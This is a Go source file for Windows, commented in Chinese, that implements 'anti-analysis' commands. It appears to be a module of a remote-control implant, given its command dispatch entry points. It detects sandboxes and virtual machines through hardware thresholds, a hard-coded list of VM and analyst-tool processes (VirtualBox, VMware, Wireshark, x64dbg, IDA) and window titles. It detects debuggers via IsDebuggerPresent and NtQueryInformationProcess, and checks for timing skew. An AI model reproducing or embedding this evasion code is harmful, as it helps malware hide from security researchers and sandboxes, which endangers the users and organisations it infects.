//go:build windows

package commands

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ===== A2: 反分析 =====
// 1. 沙箱检测：CPU/内存/磁盘/UAC/常见沙箱进程
// 2. 反调试：IsDebuggerPresent + NtQueryInformationProcess(ProcessDebugPort)
// 3. 时间偏移检测：GetTickCount64 与真实 Sleep 对比（检测沙箱时间加速）

var (
	avKernel32  = syscall.NewLazyDLL("kernel32.dll")
	avUser32    = syscall.NewLazyDLL("user32.dll")
	avNtdll     = syscall.NewLazyDLL("ntdll.dll")
	avIsDebug   = avKernel32.NewProc("IsDebuggerPresent")
	avGetTicks  = avKernel32.NewProc("GetTickCount64")
	avGlobalMem = avKernel32.NewProc("GlobalMemoryStatusEx")
	avFindWin   = avUser32.NewProc("FindWindowW")
	avNtQuery   = avNtdll.NewProc("NtQueryInformationProcess")
)

// memoryStatusEx GlobalMemoryStatusEx 结构（用于物理内存检测）
type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

// CmdSandboxCheck 综合沙箱/虚拟环境检测
func CmdSandboxCheck() ([]byte, error) {
	var checks []string
	suspicious := 0

	// 1. CPU 核数
	cores := runtime.NumCPU()
	if cores < 2 {
		checks = append(checks, fmt.Sprintf("⚠️ CPU 核数过少: %d (<2)", cores))
		suspicious++
	} else {
		checks = append(checks, fmt.Sprintf("✅ CPU 核数: %d", cores))
	}

	// 2. 物理内存
	mem := &memoryStatusEx{Length: uint32(unsafe.Sizeof(memoryStatusEx{}))}
	avGlobalMem.Call(uintptr(unsafe.Pointer(mem)))
	memGB := float64(mem.TotalPhys) / (1024 * 1024 * 1024)
	if memGB < 2 {
		checks = append(checks, fmt.Sprintf("⚠️ 物理内存过小: %.1f GB (<2GB)", memGB))
		suspicious++
	} else {
		checks = append(checks, fmt.Sprintf("✅ 物理内存: %.1f GB", memGB))
	}

	// 3. 系统盘容量
	var free, total uint64
	dirPtr, _ := syscall.UTF16PtrFromString("C:\\")
	if err := windows.GetDiskFreeSpaceEx(dirPtr, &free, &total, nil); err == nil {
		totalGB := float64(total) / (1024 * 1024 * 1024)
		if totalGB < 60 {
			checks = append(checks, fmt.Sprintf("⚠️ 系统盘过小: %.0f GB (<60GB)", totalGB))
			suspicious++
		} else {
			checks = append(checks, fmt.Sprintf("✅ 系统盘容量: %.0f GB", totalGB))
		}
	}

	// 4. 常见沙箱/虚拟化进程
	sandboxProcesses := []string{
		"vboxservice", "vboxtray", "vmsrvc", "vmwaretray", "vmwareuser",
		"vmtoolsd", "sandboxie", "sbiesvc", "procmon", "wireshark",
		"x32dbg", "x64dbg", "ollydbg", "windbg", "ida64", "ida",
	}
	procs, _ := listProcessNames()
	for _, name := range procs {
		lower := strings.ToLower(name)
		for _, sp := range sandboxProcesses {
			if strings.Contains(lower, sp) {
				checks = append(checks, fmt.Sprintf("⚠️ 检测到沙箱/分析进程: %s", name))
				suspicious++
			}
		}
	}

	// 5. 常见沙箱窗口
	sandboxWindows := []string{"VirtualBox", "VMware", "Sandboxie", "Wireshark"}
	for _, w := range sandboxWindows {
		titlePtr, _ := syscall.UTF16PtrFromString(w)
		hwnd, _, _ := avFindWin.Call(0, uintptr(unsafe.Pointer(titlePtr)))
		if hwnd != 0 {
			checks = append(checks, fmt.Sprintf("⚠️ 检测到沙箱窗口: %s", w))
			suspicious++
		}
	}

	// 6. 时间偏移检测（沙箱时间加速/暂停）
	checks = append(checks, timeSkewCheck())

	// 7. 调试器状态
	debug, _ := isDebuggerAttached()
	if debug {
		checks = append(checks, "⚠️ 检测到调试器")
		suspicious++
	} else {
		checks = append(checks, "✅ 未检测到调试器")
	}

	result := fmt.Sprintf("[沙箱检测] 可疑项: %d\n%s", suspicious, strings.Join(checks, "\n"))
	if suspicious > 0 {
		result += "\n[!] 环境疑似沙箱/分析工具"
	}
	return []byte(result), nil
}

// CmdAntidebug 反调试检查（IsDebuggerPresent + ProcessDebugPort 轮询）
func CmdAntidebug() ([]byte, error) {
	var out []string

	// 1. IsDebuggerPresent
	debugFlag, _, _ := avIsDebug.Call()
	if debugFlag != 0 {
		out = append(out, "⚠️ IsDebuggerPresent: 检测到调试器")
	} else {
		out = append(out, "✅ IsDebuggerPresent: 未检测到调试器")
	}

	// 2. NtQueryInformationProcess(ProcessDebugPort=7)，轮询 3 次
	for i := 0; i < 3; i++ {
		var debugPort uintptr
		ret, _, _ := avNtQuery.Call(
			uintptr(^uintptr(0)), // (HANDLE)-1 = 当前进程
			7,                    // ProcessDebugPort
			uintptr(unsafe.Pointer(&debugPort)),
			8, 0,
		)
		if ret == 0 && debugPort != 0 {
			out = append(out, fmt.Sprintf("⚠️ ProcessDebugPort 轮询 %d: 调试端口已设置 (0x%x)", i+1, debugPort))
		} else {
			out = append(out, fmt.Sprintf("✅ ProcessDebugPort 轮询 %d: 未设置", i+1))
		}
		time.Sleep(300 * time.Millisecond)
	}

	return []byte(strings.Join(out, "\n")), nil
}

// isDebuggerAttached 快速调试器检查
func isDebuggerAttached() (bool, error) {
	flag, _, _ := avIsDebug.Call()
	return flag != 0, nil
}

// timeSkewCheck GetTickCount64 与真实时间的偏差检测
func timeSkewCheck() string {
	start := time.Now()
	tick1, _, _ := avGetTicks.Call()
	time.Sleep(3000 * time.Millisecond)
	tick2, _, _ := avGetTicks.Call()
	elapsedReal := time.Since(start)
	elapsedTick := time.Duration(tick2-tick1) * time.Millisecond

	// 正常：tick 与真实时间应接近（±15%）；沙箱加速/暂停时偏差大
	diff := elapsedTick - elapsedReal
	if diff < 0 {
		diff = -diff
	}
	if diff > elapsedReal*15/100 {
		return fmt.Sprintf("⚠️ 时间偏移异常: tick=%.1fs 真实=%.1fs (偏差 %.1fs)",
			elapsedTick.Seconds(), elapsedReal.Seconds(), diff.Seconds())
	}
	return fmt.Sprintf("✅ 时间一致性: tick=%.1fs 真实=%.1fs", elapsedTick.Seconds(), elapsedReal.Seconds())
}

// listProcessNames 列出进程名（简化版，避免引入 gopsutil 依赖复杂度）
func listProcessNames() ([]string, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var names []string
	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err := windows.Process32First(snapshot, &entry); err != nil {
		return nil, err
	}
	for {
		name := syscall.UTF16ToString(entry.ExeFile[:])
		names = append(names, name)
		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}
	return names, nil
}

// CmdSandboxCheckEntry / CmdAntidebugEntry 命令入口（兼容 dispatch 无参调用）
func CmdSandboxCheckEntry() ([]byte, error) { return CmdSandboxCheck() }
func CmdAntidebugEntry() ([]byte, error)    { return CmdAntidebug() }

var _ = os.Getpid
